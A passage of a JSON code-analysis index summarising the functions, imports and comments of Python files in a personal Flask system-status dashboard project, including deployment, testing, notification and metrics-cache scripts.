          "def get_system_stats():\n\"\"\"Get comprehensive system statistics.\"\"\"\ntry:\nstats = {\n\"video_processing\": get_video_processing_stats(),\n\"file_mover\": get_file_mover_stats(),\n\"ssh_tunnel\": get_ssh_tunnel_stats(),\n\"events\": get_recent_events()\n}\nreturn jsonify(stats)",
          "def get_video_processing_stats():\n\"\"\"Get video processing statistics.\"\"\"\ntry:\n# Connect to PersonalAssistant SQLite database\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif not db_path.exists():\nreturn {\"status\": \"database not found\"}\n\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def get_file_mover_stats():\n\"\"\"Get file mover statistics.\"\"\"\ntry:\nbase_path = Path(\"/Volumes/Mac Mini External/MemoryCore\")\n\n# Read hash index\nhash_index = {}\nhash_index_path = base_path / \"hash_index.json\"\nif hash_index_path.exists():\nwith open(hash_index_path) as f:",
          "def get_ssh_tunnel_stats():\n\"\"\"Get SSH tunnel statistics.\"\"\"\ntry:\n# Check tunnel process\nps = subprocess.run(\n[\"ps\", \"aux\"],\ncapture_output=True,\ntext=True\n)\ntunnel_running = \"ssh.*reverse.*tunnel\" in ps.stdout",
          "def get_recent_events():\n\"\"\"Get recent events across all systems.\"\"\"\nevents = []\n\ntry:\n# Check video processing events\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif db_path.exists():\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def events():\n\"\"\"SSE endpoint for live metrics.\"\"\"\nreturn Response(\nsend_metrics(),\nmimetype='text/event-stream',\nheaders={\n'Cache-Control': 'no-cache',\n'Connection': 'keep-alive',\n'X-Accel-Buffering': 'no'\n}",
          "def format_bytes(bytes):\n\"\"\"Format bytes to human readable string.\"\"\"\nfor unit in ['B', 'KB', 'MB', 'GB', 'TB']:\nif bytes < 1024:\nreturn f\"{bytes:.1f}{unit}\"\nbytes /= 1024\nreturn f\"{bytes:.1f}TB\"\n\n@app.route('/')\ndef index():",
          "def index():\n\"\"\"Dashboard home page.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\n\n# Count running processes safely\nrunning_processes = 0\ntry:\nfor proc in psutil.process_iter(['status']):",
          "def status():\n\"\"\"Get rich system status data.\"\"\"\ntry:\n# Get CPU metrics safely\ntry:\ncpu_metrics = psutil.cpu_percent(interval=1, percpu=True)\nexcept Exception:\ncpu_metrics = [0.0]\n\n# Get process metrics safely"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import psutil",
          "import json",
          "import sqlite3",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from flask import Flask, request, jsonify, render_template, session, redirect, url_for, Response",
          "from flask_cors import CORS",
          "from threading import Lock",
          "from time import sleep",
          "from queue import Queue",
          "import subprocess"
        ],
        "comments": [
          "# Initialize Flask application",
          "# Global state for SSE",
          "# Basic system checks",
          "# Connect to PersonalAssistant SQLite database",
          "# Get processing statistics",
          "# Get active tasks",
          "# Read hash index",
          "# Count conflicts",
          "# Get recent movements from ledger",
          "# Check tunnel process",
          "# Check API endpoint",
          "# Check video processing events",
          "# Check file mover events",
          "# Count running processes safely",
          "# Get network metrics safely",
          "# Get CPU metrics safely",
          "# Get process metrics safely",
          "# Get disk metrics safely",
          "# Get network metrics safely"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 36,
        "decorators": [
          "@app.route('/healthz')",
          "@app.route('/api/stats')",
          "@app.route('/events')",
          "@app.route('/')",
          "@app.route('/api/status')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__deploy.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def _load_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig = {\n'production': {\n'host': os.getenv('DEPLOY_HOST', 'localhost'),\n'port': int(os.getenv('DEPLOY_PORT', 8000)),\n'api_key': os.getenv('DEPLOY_KEY'),\n'backup_retention_days': 7\n},\n'staging': {",
          "def create_backup(self, env: str) -> str:\n\"\"\"Create backup of current deployment.\"\"\"\nlogger.info(f\"Creating backup for {env} environment\")\n\ntimestamp = datetime.now().strftime('%Y%m%d_%H%M%S')\nbackup_path = self.backup_dir / f\"backup_{env}_{timestamp}.tar.gz\"\n\ntry:\n# Create backup archive\nsubprocess.run([",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _get_backup_manifest(self) -> Dict[str, Any]:\n\"\"\"Create manifest of backed up files.\"\"\"\nmanifest = {'files': [], 'total_size': 0}\n\nfor path in ['src', 'static', 'templates']:\ndir_path = self.base_path / path\nif dir_path.exists():\nfor file in dir_path.rglob('*'):\nif file.is_file():\nrel_path = file.relative_to(self.base_path)",
          "def deploy(self, env: str):\n\"\"\"Deploy the dashboard to specified environment.\"\"\"\nlogger.info(f\"Starting deployment to {env}\")\n\ntry:\n# Create backup first\nbackup_path = self.create_backup(env)\n\n# Deploy steps\nself._copy_files(env)",
          "def _copy_files(self, env: str):\n\"\"\"Copy files to deployment location.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\n# Use rsync for remote deployment\nsubprocess.run([\n'rsync',\n'-av',\n'--delete',",
          "def _update_config(self, env: str):\n\"\"\"Update configuration for environment.\"\"\"\nconfig = self.config[env]\n\nconfig_file = self.base_path / f\"config_{env}.json\"\nif config_file.exists():\nif env == 'production':\nsubprocess.run([\n'scp',\nstr(config_file),",
          "def _run_migrations(self, env: str):\n\"\"\"Run any necessary migrations.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'cd /opt/dashboard && python3 src/db/migrate.py'\n], check=True)",
          "def _restart_services(self, env: str):\n\"\"\"Restart application services.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'sudo systemctl restart dashboard'\n], check=True)",
          "def _record_deployment(self, env: str, backup_path: str):\n\"\"\"Record deployment details.\"\"\"\nrecord = {\n'timestamp': datetime.now().isoformat(),\n'environment': env,\n'git_commit': self._get_git_commit(),\n'backup_path': backup_path,\n'deployer': os.getenv('USER', 'unknown')\n}\n",
          "def verify(self, env: str) -> bool:\n\"\"\"Verify deployment health.\"\"\"\nconfig = self.config[env]\n\ntry:\n# Check service status\nif env == 'production':\nresult = subprocess.run([\n'ssh',\nconfig['host'],",
          "def rollback(self, env: str):\n\"\"\"Roll back to previous deployment.\"\"\"\nlogger.info(f\"Rolling back {env} deployment\")\n\ntry:\n# Find latest backup\nbackups = sorted(\nself.backup_dir.glob(f\"backup_{env}_*.tar.gz\"),\nkey=lambda x: x.stat().st_mtime,\nreverse=True",
          "def cleanup_old_backups(self, env: str):\n\"\"\"Clean up old backup files.\"\"\"\nconfig = self.config[env]\nretention_days = config['backup_retention_days']\ncutoff_time = time.time() - (retention_days * 86400)\n\nfor backup in self.backup_dir.glob(f\"backup_{env}_*.tar.gz\"):\nif backup.stat().st_mtime < cutoff_time:\nlogger.info(f\"Removing old backup: {backup}\")\nbackup.unlink()",
          "def main():\n\"\"\"Run deployment operations based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Dashboard deployment tool')\nparser.add_argument(\n'--env',\nchoices=['production', 'staging'],\ndefault='staging',\nhelp='Deployment environment'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class Deployer:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "import json",
          "import time",
          "from pathlib import Path",
          "from datetime import datetime",
          "import requests",
          "from typing import Dict, Any, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Load environment config",
          "# Create backup archive",
          "# Record backup metadata",
          "# Create backup first",
          "# Deploy steps",
          "# Record deployment",
          "# Use rsync for remote deployment",
          "# Local deployment",
          "# Check service status",
          "# Check API health",
          "# Find latest backup",
          "# Extract backup",
          "# Restart services",
          "# Verify rollback",
          "# Remove metadata file if it exists"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__dev-controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup_logging(self):"
        ],
        "class_defs": [
          "class DevelopmentController:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "import subprocess",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Check cycle time",
          "# Start new cycle",
          "# Run parallel development tracks",
          "# Monitor and adjust",
          "# Save current state",
          "# Reset active tasks",
          "# Plan next cycle",
          "# Check task completion",
          "# Adjust resources based on progress",
          "# Monitor system resources",
          "# Adjust thread allocation",
          "# Balance workload",
          "# Analyze previous cycle",
          "# Adjust priorities",
          "# Update phase targets"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__flask-test.py",
        "docstrings": [],
        "function_defs": [
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Configure logging"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__generate-status-improved.py",
        "docstrings": [],
        "function_defs": [
          "def format_html_doc(content: str) -> str:\n\"\"\"Wrap content in a complete HTML document structure.\"\"\"\nreturn f\"\"\"<!DOCTYPE html>",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\ntry:\n# Build HTML content piece by piece\nparts = []\n\n# Add header\nparts.append(\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics"
        ],
        "comments": [
          "# Initialize components",
          "# Build HTML content piece by piece",
          "# Add header",
          "# Add CSS",
          "# System metrics section",
          "# Network section",
          "# Process section",
          "# Events section",
          "# Projects and timeline section",
          "# Timeline section",
          "# Combine all parts and wrap in HTML structure"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__generate-status.py",
        "docstrings": [],
        "function_defs": [
          "def get_system_status() -> Dict:\n\"\"\"Get comprehensive system status including metrics and state.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nstatus = 'healthy'\nissues = []\nif metrics['cpu'].get('percent', 0) > 80:\nissues.append(f\"High CPU usage: {metrics['cpu']['percent']}%\")\nstatus = 'warning'\nif metrics['memory'].get('virtual', {}).get('percent', 0) > 80:",
          "def get_memorycore_stats():\n\"\"\"Get MemoryCore specific statistics.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore')\nstats = {'total_files': 0, 'total_size': 0, 'categories': {}, 'recent_changes': []}\nfor category in ['docs', 'scripts', 'data', 'models']:\ncat_path = base_path / category\nif cat_path.exists():\nfiles = list(cat_path.rglob('*'))\nfile_count = len([f for f in files if f.is_file()])\ntotal_size = sum((f.stat().st_size for f in files if f.is_file()))",
          "def get_recent_events():\n\"\"\"Get most recent events from timeline data and other sources.\"\"\"\nevents = []\nenriched_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_enriched.json')\nraw_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_data.json')\ntimeline_path = enriched_path if enriched_path.exists() else raw_path\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\ndata = json.load(f)",
          "def get_project_narrative():\n\"\"\"Get project narrative data.\"\"\"\nnarrative_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/narrative/project_narrative.json')\nif narrative_path.exists():\ntry:\nwith open(narrative_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading narrative: {e}')\nreturn None",
          "def get_system_timeline():\n\"\"\"Get system evolution timeline.\"\"\"\ntimeline_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/system_timeline.json')\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading timeline: {e}')\nreturn None",
          "def format_timeline_entry(event):\n\"\"\"Format a timeline entry for display.\"\"\"\ndate = datetime.fromisoformat(event['date'].replace('Z', '+00:00'))\nformatted_date = date.strftime('%Y-%m-%d %H:%M:%S')\ndetails = event.get('details', {})\ndetails_html = ''\nfor key, value in details.items():\nif value and str(value).strip():\ndetails_html += f\"<div class='detail'><span class='key'>{key}:</span> {value}</div>\"\nreturn f\"\\n    <div class='timeline-entry {event['type']}'>\\n        <div class='timeline-date'>{formatted_date}</div>\\n        <div class='timeline-type'>{event['type']}</div>\\n        <div class='timeline-component'>{event['component']}</div>\\n        <div class='timeline-details'>{details_html}</div>\\n    </div>\\n    \"",
          "def format_project_phase(phase):\n\"\"\"Format a project phase for display.\"\"\"\nreturn f\"\\n    <div class='phase-entry'>\\n        <div class='phase-description'>{phase['description']}</div>\\n        <div class='phase-context'>{phase['context']}</div>\\n        <div class='phase-source'>Source: {phase['source_file']}</div>\\n    </div>\\n    \"\n\ndef format_project_status(status):\n\"\"\"Format project status for display.\"\"\"",
          "def format_project_status(status):\n\"\"\"Format project status for display.\"\"\"\nhtml = \"<div class='project-status'>\"\nif 'containers' in status:\nhtml += '<h4>Containers:</h4><ul>'\nfor container, state in status['containers'].items():\nhtml += f\"<li>{container}: <span class='status-{state}'>{state}</span></li>\"\nhtml += '</ul>'\nif 'services' in status:\nhtml += '<h4>Services:</h4><ul>'",
          "def generate_network_section(network_metrics: Dict) -> str:\n\"\"\"Generate HTML for network metrics section with error handling.\"\"\"\ntry:\nhtml_parts = []\nif 'connections' in network_metrics:\nconnections = network_metrics['connections']\nhtml_parts.append(f\"<div>Total Connections: {connections.get('total', 0)}</div>\")\nif 'by_status' in connections:\nstates = [f'{state}: {count}' for state, count in connections['by_status'].items()]\nif states:",
          "def format_project_roadmap(roadmap):\n\"\"\"Format project roadmap for display.\"\"\"\nhtml = \"<div class='project-roadmap'>\"\nfor item in roadmap:\nif item['type'] == 'goals':\nhtml += '<h4>Pending Goals:</h4><ul>'\nfor goal in item['items']:\nhtml += f\"<li class='priority-{item['priority']}'>{goal}</li>\"\nhtml += '</ul>'\nelif item['type'] == 'next_phase':",
          "def generate_timeline_section(timeline_data: Optional[Dict]) -> str:\n\"\"\"Generate the timeline section HTML.\"\"\"\nif not timeline_data:\nreturn ''\nhtml = \"<div class='timeline'>\"\nhtml += \"\\n        <nav class='timeline-nav'>\\n            <div class='timeline-filters'>\\n                <button class='timeline-filter active' data-filter='all'>All</button>\\n                <button class='timeline-filter' data-filter='infrastructure'>Infrastructure</button>\\n                <button class='timeline-filter' data-filter='development'>Development</button>\\n                <button class='timeline-filter' data-filter='integration'>Integration</button>\\n                <button class='timeline-filter' data-filter='automation'>Automation</button>\\n            </div>\\n        </nav>\\n    \"\nif 'summary' in timeline_data and 'statistics' in timeline_data['summary']:\nstats = timeline_data['summary']['statistics']\nhtml += \"\\n            <div class='timeline-stats'>\\n                <h3>Timeline Statistics</h3>\\n                <div class='stats-grid'>\\n        \"\nfor category, count in stats.get('by_category', {}).items():",
          "def generate_html():\n\"\"\"Generate a simple HTML status page with error handling.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nevents = get_recent_events()\ntimeline_data = get_system_timeline()\nnarrative_data = get_project_narrative()\nprocessed_timeline = None\nif timeline_data:\ntry:",
          "def generate_error_page(error_message: str) -> str:\n\"\"\"Generate a simple error page.\"\"\"\nreturn f'\\n    <html>\\n    <head>\\n        <title>MemoryCore Status - Error</title>\\n        <style>\\n            body {{ font-family: -apple-system, system-ui, sans-serif; margin: 20px; }}\\n            .error {{ color: #f44336; padding: 20px; background: #ffebee; border-radius: 4px; }}\\n        </style>\\n    </head>\\n    <body>\\n        <h1>MemoryCore Status</h1>\\n        <div class=\"error\">\\n            <h2>Error Generating Status Page</h2>\\n            <p>{error_message}</p>\\n        </div>\\n        <script>\\n            setTimeout(() => window.location.reload(), 30000);\\n        </script>\\n    </body>\\n    </html>\\n    '\n\ndef generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\nhtml = ''\ntry:\ntimeline_css = ''\ntry:\ncss_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/src/templates/timeline.css')\nif css_path.exists():\ntimeline_css = css_path.read_text()\nexcept Exception as e:",
          "def main():\n\"\"\"Generate status page and save it.\"\"\"\ntry:\nhtml = generate_html()\noutput_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/index.html')\noutput_path.parent.mkdir(parents=True, exist_ok=True)\nwith open(output_path, 'w') as f:\nf.write(html)\nlogger.info(f'Status page generated successfully at {output_path}')\nexcept Exception as e:"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics",
          "import sys",
          "from pathlib import Path",
          "from src.processors.timeline_processor import TimelineProcessor"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 34,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__http-test.py",
        "docstrings": [],
        "function_defs": [
          "def _send_response(self, message, status=200):",
          "def do_GET(self):",
          "def run():"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler",
          "import json"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__init.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__logging-config.py",
        "docstrings": [],
        "function_defs": [
          "def setup_logging():\n\"\"\"Configure logging with rotation and structured format.\"\"\"\n# Create log directory if it doesn't exist\nLOG_DIR.mkdir(parents=True, exist_ok=True)\n\n# Create rotating file handler for debugging\nfile_handler = RotatingFileHandler(\nLOG_FILE,\nmaxBytes=MAX_BYTES,\nbackupCount=BACKUP_COUNT",
          "def log_with_context(logger, level, message, **context):\n\"\"\"\nLog a message with additional context.\n\nArgs:\nlogger: Logger instance\nlevel: Logging level (e.g., INFO, ERROR)\nmessage: Log message\n**context: Additional context as key-value pairs\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import logging",
          "from logging.handlers import RotatingFileHandler",
          "from pathlib import Path"
        ],
        "comments": [
          "# Constants",
          "# Create log directory if it doesn't exist",
          "# Create rotating file handler for debugging",
          "# Create console handler for warnings and errors",
          "# Reset root logger",
          "# Configure root logger",
          "# Create logger for this application",
          "# Add handlers directly to dashboard logger",
          "# Helper function for structured logging",
          "# For errors about common conditions (like access denied), downgrade to warning",
          "# Format context in a cleaner way"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__metrics-cache.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, ttl_seconds: int = 60):",
          "def get(self, key: str) -> Optional[Any]:\n\"\"\"\nGet a value from cache if it exists and hasn't expired.\n\nArgs:\nkey: Cache key\n\nReturns:\nCached value if valid, None otherwise\n\"\"\"",
          "def set(self, key: str, value: Any) -> None:\n\"\"\"\nSet a value in cache with current timestamp.\n\nArgs:\nkey: Cache key\nvalue: Value to cache\n\"\"\"",
          "def invalidate(self, key: str) -> None:\n\"\"\"\nRemove a key from cache.\n\nArgs:\nkey: Cache key to remove\n\"\"\"",
          "def clear(self) -> None:\n\"\"\"Clear all cached values.\"\"\"\nself.cache.clear()\n\n# Global cache instance\nmetrics_cache = MetricsCache()\n\ndef cached(ttl_seconds: int = 60):\n\"\"\"",
          "def cached(ttl_seconds: int = 60):\n\"\"\"\nDecorator for caching function results.\n\nArgs:\nttl_seconds: Time to live in seconds for cached values\n\nReturns:\nDecorator function\n\"\"\"",
          "def decorator(func):",
          "def wrapper(*args, **kwargs):"
        ],
        "class_defs": [
          "class MetricsCache:"
        ],
        "imports": [
          "import time",
          "from typing import Dict, Any, Optional",
          "from functools import wraps",
          "from datetime import datetime, timedelta"
        ],
        "comments": [
          "# Global cache instance",
          "# Create cache key from function name and arguments",
          "# Check cache first",
          "# If not in cache, compute value"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@wraps(func)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__minimal-http.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__minimal.py",
        "docstrings": [],
        "function_defs": [
          "def index():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__notify.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _send_request(self, payload: Dict[str, Any]) -> requests.Response:\n\"\"\"Send request to Pushover API with retry logic\"\"\"\nfor attempt in range(self.retry_attempts):\ntry:\nresponse = requests.post(self.PUSHOVER_API_URL, data=payload)\nresponse.raise_for_status()\nreturn response\nexcept requests.RequestException as e:\nlogger.warning(f'Attempt {attempt + 1} failed: {str(e)}')\nif attempt < self.retry_attempts - 1:",
          "def speak_message(self, message: str, voice: str='Daniel') -> None:\n\"\"\"\nSpeak the message using macOS text-to-speech\n\nArgs:\nmessage: The message to speak\nvoice: The voice to use (default: Daniel)\n\"\"\"",
          "def send_notification(self, message: str, title: Optional[str]=None, priority: str='normal', speak: bool=True, voice: str='Daniel') -> bool:\n\"\"\"\nSend a notification via Pushover\n\nArgs:\nmessage: The message to send\ntitle: Optional title for the notification\npriority: Priority level (lowest, low, normal, high, emergency)\n\nReturns:",
          "def main():"
        ],
        "class_defs": [
          "class PushoverNotifier:"
        ],
        "imports": [
          "import os",
          "import time",
          "import logging",
          "import requests",
          "import argparse",
          "import subprocess",
          "from dotenv import load_dotenv",
          "from typing import Optional, Dict, Any"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__run-dashboard.py",
        "docstrings": [],
        "function_defs": [
          "def signal_handler(signum, frame):\n\"\"\"Handle signals gracefully.\"\"\"\nlocal_logger = logging.getLogger('Launcher')\nif flask_process:\nlocal_logger.info(\"Stopping dashboard...\")\nflask_process.terminate()\ntry:\nflask_process.wait(timeout=5)\nexcept subprocess.TimeoutExpired:\nflask_process.kill()",
          "def setup_logging():\n\"\"\"Set up logging.\"\"\"\nlog_dir = Path(__file__).parent / 'logs'\nlog_dir.mkdir(exist_ok=True, parents=True)\n\nlogging.basicConfig(\nlevel=logging.INFO,\nformat='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\nhandlers=[\nlogging.FileHandler(log_dir / 'dashboard.log'),",
          "def check_dependencies():\n\"\"\"Check and install required Python packages.\"\"\"\nrequired_packages = [\n'flask',\n'werkzeug',\n'aiohttp',\n'psutil'\n]\n\nfor package in required_packages:",
          "def main():\n\"\"\"Run the dashboard.\"\"\"\nsetup_logging()\nlogger = logging.getLogger('Launcher')\n\ntry:\n# Check dependencies\ncheck_dependencies()\n\n# Set up environment"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import logging",
          "import subprocess",
          "import signal",
          "from pathlib import Path"
        ],
        "comments": [
          "# Global for the Flask process",
          "# Check dependencies",
          "# Set up environment",
          "# Start Flask application",
          "# Set up signal handlers",
          "# Start Flask process",
          "# Wait for process"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__run-tests.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def run_tests(self, test_type: Optional[str] = None, parallel: bool = True) -> bool:\n\"\"\"Run tests and generate reports.\"\"\"\nlogger.info(\"Starting test execution...\")\nstart_time = datetime.now()\n\ntry:\n# Build pytest command\ncmd = [\n'pytest',\n'--cache-clear',",
          "def _save_test_results(self, success: bool, duration: timedelta):\n\"\"\"Save test results to file.\"\"\"\nresults = {\n'timestamp': datetime.now().isoformat(),\n'success': success,\n'duration_seconds': duration.total_seconds(),\n'git_commit': self._get_git_commit()\n}\n\nresults_file = self.report_dir / 'test_results.json'",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _notify_test_completion(self, success: bool, duration: timedelta):\n\"\"\"Notify about test completion.\"\"\"\nstatus = \"PASSED\" if success else \"FAILED\"\nduration_str = str(duration).split('.')[0]  # Remove microseconds\n\nlogger.info(f\"Tests {status} in {duration_str}\")\n\n# Open reports in browser if available\nif self.report_dir.exists():\nreport_path = self.report_dir / 'report.html'",
          "def clean_reports(self):\n\"\"\"Clean old report files.\"\"\"\nif self.report_dir.exists():\nfor item in self.report_dir.iterdir():\nif item.is_file():\nitem.unlink()\n\nif self.coverage_dir.exists():\nfor item in self.coverage_dir.iterdir():\nif item.is_file():",
          "def main():\n\"\"\"Run tests based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Run dashboard tests')\nparser.add_argument(\n'--type',\nchoices=['all', 'smoke', 'integration'],\ndefault='all',\nhelp='Type of tests to run'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class TestRunner:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "from datetime import datetime",
          "from pathlib import Path",
          "import json",
          "import webbrowser",
          "from typing import List, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Build pytest command",
          "# Add coverage options",
          "# Add HTML report",
          "# Add test selection if specified",
          "# Add parallel execution if enabled",
          "# Run tests",
          "# Process results",
          "# Open reports in browser if available"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__setup-auth.py",
        "docstrings": [],
        "function_defs": [
          "def generate_salt() -> str:\n\"\"\"Generate a random salt.\"\"\"\nreturn base64.b64encode(secrets.token_bytes(16)).decode('utf-8')\n\ndef hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"",
          "def hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"\ncombined = password.encode() + base64.b64decode(salt)\nreturn base64.b64encode(hashlib.sha256(combined).digest()).decode('utf-8')\n\ndef main():\n\"\"\"Set up dashboard authentication.\"\"\"",
